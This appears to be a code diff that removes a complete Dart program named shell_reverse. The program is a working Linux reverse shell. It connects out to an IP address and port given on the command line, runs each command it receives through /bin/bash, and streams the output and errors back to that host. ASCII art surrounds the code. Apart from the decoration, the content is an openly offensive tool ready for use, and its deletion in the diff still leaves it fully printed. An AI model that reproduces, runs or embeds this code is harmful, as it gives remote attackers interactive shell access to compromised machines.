--- shell_reverse/bin/shell_reverse.dart
@@ -1,80 +1,0 @@
-import 'dart:io';
-import 'dart:convert';
-import 'dart:typed_data';
-
-/*█▀▀▄░░░░░░░░░░░▄▀▀█
-░█░░░▀▄░▄▄▄▄▄░▄▀░░░█
-░░▀▄░░░▀░░░░░▀░░░▄▀
-░░░░▌░▄▄░░░▄▄░▐▀▀
-░░░▐░░█▄░░░▄█░░▌▄▄▀▀▀▀█ 
-░░░▌▄▄▀▀░▄░▀▀▄▄▐░░░░░░█
-▄▀▀▐▀▀░▄▄▄▄▄░▀▀▌▄▄▄░░░█
-█░░░▀▄░█░░░█░▄▀░░░░█▀▀▀
-░▀▄░░▀░░▀▀▀░░▀░░░▄█▀
-░░░█░░░░░░░░░░░▄▀▄░▀▄
-░░░█░░░░░░░░░▄▀█░░█░░█
-░░░█░░░░░░░░░░░█▄█░░▄▀
-░░░█░░░░░░░░░░░████▀
-░░░▀▄▄▀▀▄▄▀▀▄▄▄█▀*/
-
-void main(List<String> arguments) {
-  if (arguments.length == 2) {
-    if (Platform.isLinux) {
-      reverseShellLinux(arguments);
-    } else {
-      // TO-DO
-    }
-  } else {
-    print('use ./shell_reverse <ip> <port>');
-  }
-}
-
-void reverseShellLinux(List<String> arguments) =>
-    Socket.connect(arguments.first, int.parse(arguments.last)).then(
-      (Socket socket) => socket.listen(
-        (Uint8List data) =>
-            Process.start('/bin/bash', ['-a']).then((Process process) {
-          process.stdin.writeln(String.fromCharCodes(data).trim());
-          process.stdout.transform(utf8.decoder).listen((String output) {
-            socket.write(output);
-            socket.flush();
-          });
-          process.stderr.transform(utf8.decoder).listen((String error) {
-            socket.write(error);
-            socket.flush();
-          });
-        }),
-        onError: (error) {
-          print(error);
-        },
-        onDone: () => socket.destroy(),
-      ),
-    );
-
-/*
-███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█ 
-████▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█ 
-███▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
-████▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
-███▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█ 
-████████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█ 
-███▓▓▓▓▓▓▓╬╬▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
-████▓▓▓╬╬╬╬▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
-███▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
-█████▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
-█████▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ 
-█████▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ 
-████▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ 
-████▓▓███▓▓▓▓▓▓▓██▓╬╬╬╬╬╬╬╬╬╬╬╬█▓╬▓╬╬▓██ 
-█████▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██ 
-█████▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███ 
-██████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███ 
-███████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████ 
-███████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████ 
-████████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████ 
-█████████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████ 
-██████████▓▓▓█▓▓▓╬▓██╬╬╬╬╬╬╬╬╬╬╬▓███████ 
-███████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████ 
-██████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬██████████ 
-███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████
-*/
